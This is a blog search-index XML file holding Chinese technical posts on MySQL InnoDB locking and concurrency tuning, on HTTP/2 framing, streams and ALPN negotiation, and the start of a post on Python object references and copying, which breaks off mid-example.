<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>详解 MySQL 锁</title>
    <link href="/post/%E8%AF%A6%E8%A7%A3MySQL%E9%94%81/"/>
    <url>/post/%E8%AF%A6%E8%A7%A3MySQL%E9%94%81/</url>
    
    <content type="html"><![CDATA[<p>数据库锁设计的初衷是 <strong>处理并发问题</strong>。作为多用户共享的资源，当出现并发访问的时候，数据库需要合理地控制资源的访问规则，而锁就是用来实现这些访问规则的重要数据结构。</p><p>以 InnoDB 引擎为例，根据加锁的范围，MySQL 里面的锁可以分为 <strong>行级锁、表级锁、全局锁</strong> 三类。</p><h2 id="行级锁"><a href="#行级锁" class="headerlink" title="行级锁"></a>行级锁</h2><p>行级锁是 MySQL 中锁定粒度 <strong>最细</strong> 的一种锁，表示只针对当前操作的数据行进行加锁。行级锁是 InnoDB 引擎的特性之一，能大大减少数据库操作的冲突，并发度最高；但加锁的开销也最大，<strong>可能会出现死锁</strong>。</p><p>在 InnoDB 中支持三种行锁定方式：</p><ul><li><strong>行锁（Record Lock）</strong>：锁定一个或多个行记录，分为共享锁和排他锁。</li><li><strong>间隙锁（Gap Lock）</strong>：锁定行记录的间隙，即锁定一个范围，但不包括记录本身。</li><li><strong>Next-Key Lock</strong>：行锁和间隙锁合称为 Next-Key Lock，可以锁定一个范围，并且包括记录本身（前开后闭区间）。</li></ul><p><strong>注意：InnoDB 行锁是通过给索引上的索引项加锁来实现的，这意味着只有通过索引检索数据时，才可以使用行锁，否则将使用表锁。</strong></p><h3 id="共享锁"><a href="#共享锁" class="headerlink" title="共享锁"></a>共享锁</h3><p>**共享锁（Shared Lock，S)**，又称为 <strong>读锁</strong>，可以在事务间互相共享，多个用户可以同时读取同一个资源（但无法修改），而不会造成阻塞。若事务 T 对数据对象 A 加上 S 锁，则事务 T <strong>可以读取 A 但不能修改 A</strong>（若此时 A 上没有其他 S 锁，则 T 可以修改 A，但不推荐这样做），其他事务只能再对 A 加 S 锁，而不能加 X 锁，直到 T 释放 A 上的 S 锁。这保证了其他事务可以访问 A，但在 T 释放 A 上的 S 锁之前不能对 A 做任何修改。</p><p>语法：<code>select ... lock in share mode</code></p><h3 id="排他锁"><a href="#排他锁" class="headerlink" title="排他锁"></a>排他锁</h3><p><strong>排他锁（Exclusive Lock，X）</strong>，又称为 <strong>写锁</strong>，会排斥其他所有获取锁的请求（S 锁和 X 锁），一直阻塞，直到事务操作完成。若事务 T 对数据对象 A 加上 X 锁，则事务 T <strong>可以读取 A 也可以修改 A</strong>，其他事务不能再对 A 加任何锁（可以同时读取 A 但不能修改），直到 T 释放 A 上的 X 锁。</p><p>语法：<code>select ... for update</code></p><p>注意：在 MySQL InnoDB 引擎下，<strong>每个 DML 语句都会自动给涉及到的数据加上排他锁，DQL 语句不会加任何类型的锁。</strong>所以加排他锁的数据行在其他事务中不能被修改，也不能通过 <code>lock in share mode</code> 和 <code>for update</code> 的方式查询数据，但可以直接通过 <code>select … from …</code> 进行查询。</p><blockquote><p>使用 DML 语句时发生的锁定也被称为 “隐式锁定”，而通过 “共享锁”、“排他锁” 等方式导致的锁定被称为 “显式锁定”。</p></blockquote><h3 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h3><p>我们知道，产生幻读的原因是行锁只能锁住行，但是插入新记录这个动作，要更新的是记录之间的 “间隙”。因此，为了解决幻读问题，InnoDB 只好引入新的锁，也就是 <strong>间隙锁（Gap Lock）</strong>。</p><p>默认情况下，InnoDB 工作在 RR 隔离级别下，会以 Next-Key Lock 的方式对数据行进行加锁。Next-Key Lock 是行锁和间隙锁的组合，即当 InnoDB 扫描索引记录的时候，会首先对索引记录加上行锁，再对索引记录的间隙加上间隙锁。这样其他事务既不能修改这个记录，也不能在这个间隙插入记录，可以有效防止幻读的发生。</p><p>例如，执行一条范围条件检索的 SQL 语句：<code>select * from blog where id &gt; 100 for update</code>。此时，InnoDB 不仅会对符合条件 <em>id &gt; 100</em> 的记录加锁，还会对符合 <em>id &gt; 100</em> 但并不存在记录的行加锁。</p><h2 id="表级锁"><a href="#表级锁" class="headerlink" title="表级锁"></a>表级锁</h2><p>表级锁是 MySQL 中锁定粒度 <strong>较大</strong> 的一种锁，表示对当前操作的整张表加锁。表级锁的实现简单，资源消耗较少，不会出现死锁，被大部分 MySQL 引擎支持，如最常用的 MyISAM 和 InnoDB；但加锁的范围比较大，发生冲突的概率高，从而导致并发度较低。</p><p>MySQL 里面表级别的锁有两种，一种是表锁，一种是元数据锁，在 InnoDB 下还有另一种表级锁为意向锁。</p><h3 id="表锁"><a href="#表锁" class="headerlink" title="表锁"></a>表锁</h3><p>表锁有两种模式，分为 <strong>表共享读锁（Table Read Lock）</strong>和 <strong>表独占写锁（Table Write Lock）</strong>，并提供了与之对应的锁定表和解锁表的语法功能：</p><ul><li>锁定表：<code>lock tables ... read/write</code>，为当前会话锁定表（申请一个表级别的元数据锁）；</li><li>解锁表：<code>unlock tables</code>，释放被当前会话持有的任何锁。</li></ul><h3 id="元数据锁"><a href="#元数据锁" class="headerlink" title="元数据锁"></a>元数据锁</h3><p>元数据就是表的基础信息，<strong>元数据锁（Metadata Lock，MDL）</strong>的主要作用是在并发访问时维护表元数据的一致性，在表上有活动事务的时候，不可以对元数据进行修改操作。</p><p>元数据锁是在 MySQL Server 层实现的表级锁，<strong>不需要显式使用</strong>。每执行一条 DML、DDL 语句时都会申请 MDL 锁，这个加锁过程由系统自动控制，无法直接干预。在执行 DML 操作时会自动加读锁，在执行 DDL 操作时自动加写锁，读读共享、读写互斥、写写互斥，同时写锁获取的优先级要高于读锁。</p><p>一旦出现写锁等待，不仅会阻塞当前操作，同时还会阻塞后续该表的所有操作。事务一旦申请到 MDL 锁后，直到事务执行结束才会将锁释放。特殊情况是，如果事务中包含 DDL 操作，MySQL 会在 DDL 操作语句执行前 <strong>进行隐式提交</strong>，以保证该条语句作为一个单独的事务存在，同时也保证写锁的释放。</p><blockquote><p>当事务等待元数据锁时，执行 <code>show processlist</code>，可以看到 “Waiting for table metadata lock” 字样。</p></blockquote><p>当出现元数据锁导致多个会话发生阻塞不可用时，通常用 <code>kill thread_id</code> 的方式来结束掉 MySQL 的客户端连接，如 <code>kill 23</code>。</p><h3 id="意向锁"><a href="#意向锁" class="headerlink" title="意向锁"></a>意向锁</h3><p>为了允许行锁和表锁共存，实现多粒度锁机制，InnoDB 还有两种内部使用的 <strong>意向锁（Intention Lock）</strong>：</p><ul><li>意向共享锁（IS）：表示事务准备给数据行加共享锁，事务在给一个数据行加共享锁前必须先取得该表的 IS 锁。</li><li>意向排他锁（IX）：表示事务准备给数据行加排他锁，事务在给一个数据行加排他锁前必须先取得该表的 IX 锁。</li></ul><p>这两种意向锁都是表级锁，是 InnoDB 自动添加的，<strong>不需要用户干预</strong>。如果一个事务请求的锁模式与当前的锁兼容，InnoDB 就把请求的锁授予该事务；反之，如果两者不兼容，该事务就要进行阻塞，直到锁释放。</p><p>InnoDB 意向锁、共享锁、排他锁兼容性如下：</p><table><thead><tr><th></th><th>X</th><th>IX</th><th>S</th><th>IS</th></tr></thead><tbody><tr><td><strong>X</strong></td><td>冲突</td><td>冲突</td><td>冲突</td><td>冲突</td></tr><tr><td><strong>IX</strong></td><td>冲突</td><td>兼容</td><td>冲突</td><td>兼容</td></tr><tr><td><strong>S</strong></td><td>冲突</td><td>冲突</td><td>兼容</td><td>兼容</td></tr><tr><td><strong>IS</strong></td><td>冲突</td><td>兼容</td><td>兼容</td><td>兼容</td></tr></tbody></table><h2 id="全局锁"><a href="#全局锁" class="headerlink" title="全局锁"></a>全局锁</h2><p>全局锁是 MySQL 中锁定粒度 <strong>最大</strong> 的一种锁，会对整个 MySQL 实例加锁，加锁之后数据库整体处于 <strong>只读状态</strong>，阻止所有 DML、DDL 操作，<strong>典型使用场景是进行全库逻辑备份</strong>。命令如下：</p><ul><li>锁定表：<code>flush tables with read lock</code></li><li>解锁表：<code>unlock tables</code></li></ul><h2 id="乐观锁与悲观锁"><a href="#乐观锁与悲观锁" class="headerlink" title="乐观锁与悲观锁"></a>乐观锁与悲观锁</h2><p>乐观锁和悲观锁是 <strong>人为定义的概念</strong> ，可以理解为是处理并发资源的一种思想和常用手段，用于解决 <strong>第二类丢失更新问题</strong>，不要把它们与 MySQL 中提供的锁机制（表锁、行锁、共享锁、排他锁等）混为一谈。</p><h3 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h3><p><strong>乐观锁（Optimistic Lock）</strong>，顾名思义就是很乐观，每次操作时都假设事务不会发生并发冲突（丢失更新），所以不会上锁。但在提交更新时会检查是否存在冲突，并且由应用程序处理。好处是不存在死锁的情况，<strong>适用于读多写少的应用场景</strong>。如果经常发生冲突，上层应用不断让用户进行重试操作，反而会降低性能，这种情况下悲观锁就比较适用。</p><p>一般来说，乐观锁是基于版本号实现的，具体又可以分为以下两种：</p><ul><li><p>使用数据版本机制（Version）：在数据表中增加一个数字类型的 <code>version</code> 字段，数据每更新一次，将对应的记录的 <code>version</code> 值加 <code>1</code>。在查询记录时，同时获取 <code>version</code> 字段值，在提交更新时，判断此刻的 <code>version</code> 值是否与之前查询出来的 <code>version</code> 的值相等。如果相同则予以更新，否则认为是过期数据，需要重试。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs mysql">select tokens, version from bucket where id=1;  # version=1<br>update bucket set tokens=new_tokens,version=version+1 where id=1 and version=1;  # new_tokens由程序计算得到<br></code></pre></td></tr></table></figure></li><li><p>使用时间戳机制（Timestamp）：和上面的处理逻辑类似，在表中新增一个时间戳类型字段。在提交更新时，检查当前数据库中的时间戳和自己更新前取到的时间戳是否相同，如果相同则予以更新，否则需要重试。</p></li></ul><p><strong>注意：乐观锁的更新操作，最好用主键或者唯一索引来更新，这样是行锁，否则更新时会使用表锁。</strong></p><h3 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h3><p><strong>悲观锁（Pessimistic Lock）</strong>，顾名思义就是很悲观，每次操作时都假设事务会发生并发冲突，所以每次在拿数据时都会上锁，屏蔽一切可能违反数据完整性的操作。悲观锁的实现，通常依靠数据库提供的锁机制实现，比如 InnoDB 中的 <strong>排他锁</strong> 和 <strong>共享锁</strong> 都属于悲观锁的范畴。</p><h2 id="并发优化"><a href="#并发优化" class="headerlink" title="并发优化"></a>并发优化</h2><p>在了解 InnoDB 锁特性后，我们可以通过设计来减少并发场景下的锁冲突和死锁，优化方式包括：</p><ol><li>尽量使用较低的事务隔离级别，不要申请超过实际需要的锁级别；</li><li>选择合理的事务大小，小事务发生锁冲突的几率也更小；</li><li>除非必须，查询时不要显示加锁；</li><li>如果事务中需要锁定多个行，把最可能造成锁冲突、最可能影响并发度的锁往后放；</li><li>不同程序并发存取多个表时，尽量约定以相同的顺序访问各表，对一个表而言，尽可能以固定的顺序存取表中的行；</li><li>精心设计索引，尽量使用索引访问数据；</li><li>尽量用索引上的等值查询访问数据，避免间隙锁对并发插入的影响；</li><li>对于非常容易产生死锁的业务部分，可以通过表锁来减少死锁的可能。</li></ol><p>当程序还是无可避免的进入死锁状态后，有两种策略：</p><ul><li>一种是直接进入等待，直到 <strong>超时</strong>。这个超时时间可以通过参数 <code>innodb_lock_wait_timeout</code> 来设置；</li><li>另一种是 <strong>发起死锁检测</strong>，发现死锁后，主动回滚死锁链条中的某一个事务，让其他事务得以继续执行。将参数 <code>innodb_deadlock_detect</code> 设置为 on，表示开启这个逻辑。</li></ul>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>MySQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>锁机制</tag>
      
      <tag>高并发</tag>
      
      <tag>MySQL</tag>
      
      <tag>InnoDB</tag>
      
      <tag>并发优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>透视 HTTP 协议（四）</title>
    <link href="/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>原本不安全的 HTTP 协议，通过引入 SSL/TLS 在安全上达到了 “极致”，但在性能提升方面却是乏善可陈，只优化了握手加密的环节，对于整体的数据传输没有提出更好的改进方案，还只能依赖于 “长连接” 这种 “落后” 的技术。</p><p>所以，在 HTTPS 逐渐成熟之后，HTTP 就向着 <strong>性能方面</strong> 开始发力。由 Google 率先发明了 SPDY 协议，随后互联网工程组 IETF 以 SPDY 为基础，综合其他多方的意见，终于推出了 HTTP/1 的继任者 <strong>HTTP/2</strong>，在性能方面有了一个大的飞跃。</p><h2 id="兼容-HTTP-1"><a href="#兼容-HTTP-1" class="headerlink" title="兼容 HTTP/1"></a>兼容 HTTP/1</h2><p>由于 HTTPS 已经在安全方面做的非常好了，所以 HTTP/2 的唯一目标就是改进性能。</p><p>但它不仅背负着众多的期待，同时还背负着 HTTP/1 庞大的历史包袱。<strong>对于协议的修改必须小心谨慎，兼容性是首要考虑的目标</strong>，否则就会破坏互联网上无数现有的资产，这方面 TLS 已经有了先例。</p><p>因为必须要保持功能上的兼容，所以 HTTP/2 把 HTTP 分解成了 <strong>“语义”</strong> 和 <strong>“语法”</strong> 两个部分，<strong>语义层不做改动，与 HTTP/1 完全一致</strong>。比如请求方法、URI、状态码、头字段等概念都保留不变，这样就消除了再学习的成本，基于 HTTP 的上层应用也不需要做任何修改，可以无缝转换到 HTTP/2。</p><p>特别要说的是，与 HTTPS 不同，HTTP/2 没有在 URI 里引入新的协议名，仍然用 “http” 表示明文协议，用 “https” 表示加密协议。这是一个非常了不起的决定，可以让浏览器或者服务器去自动升级或降级协议，免去了选择的麻烦，让用户在上网的时候都意识不到协议的切换，实现平滑过渡。</p><p>在语义保持稳定之后，HTTP/2 在语法层做了天翻地覆的改造，完全变更了 HTTP 报文的传输格式。</p><h2 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h2><p>我们知道，在 HTTP/1 中可以用头字段 Content-Encoding 指定 Body 的编码方式，比如用 gzip 压缩来节约带宽，但报文的另一个组成部分——Header 却被忽略了，没有针对它的优化手段。</p><p>由于报文 Header 一般会携带 User Agent、Cookie、Accept、Server 等许多固定的头字段，多达几百字节甚至上千字节，但 Body 却经常只有几十字节（比如 GET 请求、204/301/304 响应），成了不折不扣的 “大头儿子”。更要命的是，成千上万的请求响应报文里有很多字段值都是重复的，非常浪费，大量带宽消耗在了这些冗余度极高的数据上。</p><p>所以，HTTP/2 把 <strong>头部压缩</strong> 作为了性能改进的一个重点。</p><p>不过 HTTP/2 并没有使用传统的压缩算法，而是开发了专门的 <strong>HPACK</strong> 算法，在客户端和服务器两端建立 “字典”，用索引号表示重复的字符串，还釆用哈夫曼编码来压缩整数和字符串，可以达到 50%~90% 的高压缩率。</p><h2 id="二进制“帧”"><a href="#二进制“帧”" class="headerlink" title="二进制“帧”"></a>二进制“帧”</h2><p>HTTP/2 在 HTTP/1 用纯文本形式的报文上没有妥协，不再使用肉眼可见的 ASCII 码，而是向下层的 TCP/IP 协议靠拢，全面采用 <strong>二进制格式</strong>。</p><p>这种方式虽然对人不友好，但却大大方便了计算机的解析。原来使用纯文本的时候容易出现多义性，比如大小写、空白字符、回车换行等等，程序在处理时必须用复杂的状态机，效率低还麻烦。而二进制里只有 “0” 和 “1”，可以严格规定字段大小、顺序、标志位等格式，“对就是对，错就是错”，解析起来没有歧义，实现简单，而且体积小、速度快，做到 <strong>内部提效</strong>。</p><p>以二进制格式为基础，HTTP/2 就开始了大刀阔斧的改革。</p><p>它把 TCP 协议的部分特性挪到了应用层，把原来的 Header+Body 的消息打散为数个小片的 <strong>二进制帧（Frame）</strong>，用 HEADERS 帧存放头数据、DATA 帧存放实体数据。</p><p>这种做法有点像是 Chunked 分块编码的方式，也是 “化整为零” 的思路，但 HTTP/2 数据分帧后 Header+Body 的报文结构就完全消失了，协议看到的只是一个个的 “碎片”。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/8fe2cbd57410299a1a36d7eb105ea896.png"></p><h2 id="虚拟的“流”"><a href="#虚拟的“流”" class="headerlink" title="虚拟的“流”"></a>虚拟的“流”</h2><p>“消息碎片” 到达目的地后应该怎么组装起来呢？</p><p>HTTP/2 为此定义了一个 <strong>流（Stream）</strong>的概念，<strong>它是二进制帧的双向传输序列</strong>，在同一个消息往返的帧会分配一个唯一的 <strong>Stream ID</strong>。你可以想象把它成是一个虚拟的 “数据流”，在里面流动的是一串有先后顺序的数据帧，这些数据帧按照次序组装起来就是 HTTP/1 里的请求报文和响应报文。</p><p>因为 “流” 是虚拟的，实际上并不存在，所以 HTTP/2 就可以在一个 TCP 连接上用 “流” 同时发送多个 “碎片化” 的消息，这就是常说的 <strong>多路复用（Multiplexing）</strong>——多个往返通信都复用一个连接来处理。</p><p>在 “流” 的层面上看，消息是一些有序的 “帧” 序列，而在 “连接” 的层面上看，消息却是乱序收发的 “帧”。多个请求、响应之间没有了顺序关系，不需要排队等待，也就 <strong>不会再出现 “队头阻塞” 问题</strong>，降低了延迟，大幅度提高了连接的利用率。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/b49595a5a425c0e67d46ee17cc212e7e.png"></p><p>为了更好地利用连接，加大吞吐量，HTTP/2 还添加了一些控制帧来管理虚拟的 “流”，实现了优先级和流量控制，这些特性也和 TCP 协议非常相似。</p><p>HTTP/2 还在一定程度上改变了传统的 “请求-应答” 工作模式，服务器不再是完全被动地响应请求，也可以新建 “流” 主动向客户端发送消息。比如，在浏览器刚请求 HTML 的时候就提前把可能会用到的 JS、CSS 文件发给客户端，减少等待的延迟，这被称为 <strong>服务器推送（Server Push）</strong>。</p><h2 id="强化安全"><a href="#强化安全" class="headerlink" title="强化安全"></a>强化安全</h2><p>出于兼容的考虑，HTTP/2 延续了 HTTP/1 的 “明文” 特点，可以像以前一样使用明文传输数据（二进制），不强制使用加密通信。</p><p>但由于 HTTPS 已经是大势所趋，而且主流的浏览器 Chrome、Firefox 等都公开宣布只支持加密的 HTTP/2，所以 <strong>事实上的 HTTP/2 是加密的</strong>。也就是说，我们通常所能见到的 HTTP/2 都是使用 https 协议名，跑在 TLS 上面。</p><blockquote><p>为了区分 “加密” 和 “明文” 这两个不同的版本，HTTP/2 协议定义了两个字符串标识符：“h2” 表示加密的 HTTP/2，“h2c” 表示明文的 HTTP/2。</p></blockquote><p>在 HTTP/2 标准制定的时候（2015 年）已经发现了很多 SSL/TLS 的弱点，而新的 TLSv1.3 还未发布，所以加密版本的 HTTP/2 在安全方面做了强化，要求下层的通信协议必须是 TLSv1.2 以上，还要支持前向安全和 SNI，并且把几百个弱密码套件列入了 “黑名单”，比如 DES、RC4、CBC、SHA-1 都不能在 HTTP/2 里使用，相当于底层用的是 “TLSv1.25”。</p><h2 id="ALPN"><a href="#ALPN" class="headerlink" title="ALPN"></a>ALPN</h2><p>在 URI 里用的都是 https，也没有版本标记，那么浏览器怎么知道服务器支持 HTTP/2 呢？</p><p>答案在 TLS 的扩展里，有一个 <strong>ALPN（Application Layer Protocol Negotiation，应用层协议协商）</strong>字段，用来与服务器协商在 TLS 上使用的应用协议。</p><p>客户端在发起 “Client Hello” 握手的时候，后面会带上一个 ALPN 扩展，里面按照优先顺序列出客户端支持的应用协议。就像下面这样，最优先的是 h2，其次是 http/1.1，以后还可能会有 h3。</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">Extension: application_layer_protocol_negotiation (len=14)<br>    ALPN Protocol<br>        ALPN Next Protocol: h2<br>        ALPN Next Protocol: http/1.1<br></code></pre></td></tr></table></figure><p>服务器看到 ALPN 扩展以后就可以从列表里选择一种应用协议，在 “Server Hello” 里也带上 “ALPN” 扩展，告诉客户端服务器决定使用的是哪一种。因为我们在 Nginx 配置里使用了 HTTP/2 协议，所以在这里它选择的就是 “h2”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Extension: application_layer_protocol_negotiation (len=5)<br>    ALPN Protocol<br>        ALPN string length: 2<br>        ALPN Next Protocol: h2<br></code></pre></td></tr></table></figure><p>这样在 TLS 握手结束后，客户端和服务器就通过 “ALPN” 完成了应用层的协议协商，后面就可以使用 HTTP/2 通信了。</p><blockquote><p>对于明文的 HTTP/2（h2c），由于其不使用 TLS，也就无法使用 ALPN 进行协议协商，所以需要客户端使用头字段 Connection: upgrade 升级到 HTTP/2，服务器返回状态码 101 表示同意切换协议。</p></blockquote><h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><p>下面的这张图对比了 HTTP/1、HTTPS 和 HTTP/2 的协议栈，可以清晰地看到，HTTP/2 是建立在 HPack、Stream、TLS1.2 基础之上的，比 HTTP/1 和 HTTPS 更复杂了一些。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/83c9f0ecad361ba8ef8f3b73d6872f1a.png"></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>HTTP</tag>
      
      <tag>HTTP2</tag>
      
      <tag>ALPN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 垃圾回收</title>
    <link href="/post/Python%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    <url>/post/Python%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</url>
    
    <content type="html"><![CDATA[<p><strong>垃圾回收（Garbage Collection，GC）</strong>是 Python 自带的机制，用于自动释放不会再用到的内存空间。在实现上，以 <strong>引用计数</strong> 机制为主，以 <strong>标记清除</strong> 和 <strong>分代收集</strong> 两种算法为辅。</p><blockquote><p>必要时可使用 objgraph 可视化分析工具，定位内存泄露。</p></blockquote><h2 id="函数的参数传递机制"><a href="#函数的参数传递机制" class="headerlink" title="函数的参数传递机制"></a>函数的参数传递机制</h2><p>当调用函数时，基本的参数传递机制有三种形式：<strong>值传递、指针传递、引用传递</strong>。 </p><p><strong>值传递（pass by value）</strong>：形参是实参的拷贝，会作为局部变量额外申请内存空间，改变形参的值并不会影响外部实参的值。</p><p><strong>指针传递（pass by pointer）</strong>：形参为指向实参地址的指针，当对形参的指向进行操作时，就相当于对实参本身进行操作。（C、C++ 专属）</p><p><strong>引用传递（pass by reference）</strong>：形参相当于是实参的“别名”，实际传递的还是对象地址，对形参的操作其实就是对实参的操作。</p><h2 id="Python-的对象引用"><a href="#Python-的对象引用" class="headerlink" title="Python 的对象引用"></a>Python 的对象引用</h2><p>在 Python 中函数传递参数时 <strong>既非传值也不是传引用</strong>，而是采用 <strong>对象引用传递（pass by object reference）</strong> 的方式。实际上，这种方式相当于传值和传引用的一种综合——当函数参数为可变对象时，传递的是引用；当函数参数为不可变对象时，传递的是值。</p><blockquote><p>不可变对象（Immutable Object）：长度大小固定，无法增加删除或者改变元素，如 数值 Int / Float、字符串 String、元组 Tuple<br>可变对象（Mutable Object）：长度大小不固定，可以随意地增加删除或者改变元素，如 列表 List、字典 Dict、集合 Set</p></blockquote><p><strong>示例：对象引用练习</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在下面的代码中，l1、l2和l3都指向同一个对象吗？</span><br>l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>l2 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>l3 = l2<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(l1))  <span class="hljs-comment"># 2175559002624</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(l2))  <span class="hljs-comment"># 2175559002752</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(l3))  <span class="hljs-comment"># 2175559002752</span><br><br>---------<br><span class="hljs-comment"># 在下面的代码中，最后d的输出是什么？</span><br>d = &#123;&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">d</span>):</span><br>    d[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-number">10</span><br>    d[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-number">20</span><br>    d = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><br>func(d)<br><span class="hljs-built_in">print</span>(d)  <span class="hljs-comment"># &#123;&#x27;a&#x27;: 10, &#x27;b&#x27;: 20&#125;</span><br></code></pre></td></tr></table></figure><h2 id="对象的赋值和拷贝"><a href="#对象的赋值和拷贝" class="headerlink" title="对象的赋值和拷贝"></a>对象的赋值和拷贝</h2><p><strong>浅拷贝（shallow copy）</strong>：重新分配一块内存，创建一个新的对象，<strong>其中的元素是原对象中子对象的引用</strong>。</p><p><strong>深拷贝（deep copy）</strong>：重新分配一块内存，创建一个新的对象，并且将原对象中的元素，以递归的方式，通过创建新的子对象拷贝到新对象中。因此，<strong>新对象和原对象没有任何关联。</strong></p><blockquote><p><code>==</code> 操作符比较对象之间的值是否相等；<br><code>is</code>操作符比较对象的身份标识是否相等，即它们是否为同一个对象，是否指向同一个内存地址；<br>使用 <code>id(object)</code> 方法，获得一个对象的身份标识（在内存中唯一）。</p></blockquote><p><strong>示例一：创建浅拷贝</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><br>l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>l2 = l1  <span class="hljs-comment"># 对象引用传递</span><br>l3 = l1[:]  <span class="hljs-comment"># 使用切片操作符创建浅拷贝（仅适用于可变对象）</span><br>l4 = <span class="hljs-built_in">list</span>(l1)  <span class="hljs-comment"># 使用数据类型本身的构造器创建浅拷贝</span><br>l5 = copy.copy(l1)  <span class="hljs-comment"># 使用copy函数创建浅拷贝</span><br><br><span class="hljs-built_in">print</span>(l2 == l1)  <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(l3 == l1)  <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(l4 == l1)  <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(l5 == l1)  <span class="hljs-comment"># True</span><br><br><span class="hljs-built_in">print</span>(l2 <span class="hljs-keyword">is</span> l1)  <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(l3 <span class="hljs-keyword">is</span> l1)  <span class="hljs-comment"># False</span><br><span class="hljs-built_in">print</span>(l4 <span class="hljs-keyword">is</span> l1)  <span class="hljs-comment"># False</span><br><span class="hljs-built_in">print</span>(l5 <span class="hljs-keyword">is</span> l1)  <span class="hljs-comment"># False</span><br></code></pre></td></tr></table></figure><p>在浅拷贝中，如果原对象中的元素不可变，那倒无所谓；但如果元素可变，浅拷贝通常会带来一些副作用，尤其需要注意。</p><p><strong>示例二：浅拷贝的副作用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><br>l1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], (<span class="hljs-number">30</span>, <span class="hljs-number">40</span>)]<br>l2 = <span class="hljs-built_in">list</span>(l1)  <span class="hljs-comment"># 创建浅拷贝，l2中的元素和l1中的元素指向同一个列表和元组对象</span><br><br>l1.append(<span class="hljs-number">100</span>)  <span class="hljs-comment"># l1和l2不共享内存地址，操作后l1改变，l2不变</span><br>l1[<span class="hljs-number">0</span>].append(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 列表为可变对象，此处修改了l1和l2共同指向的同一个列表，l1、l2同时改变</span><br><span class="hljs-built_in">print</span>(l1)  <span class="hljs-comment"># [[1, 2, 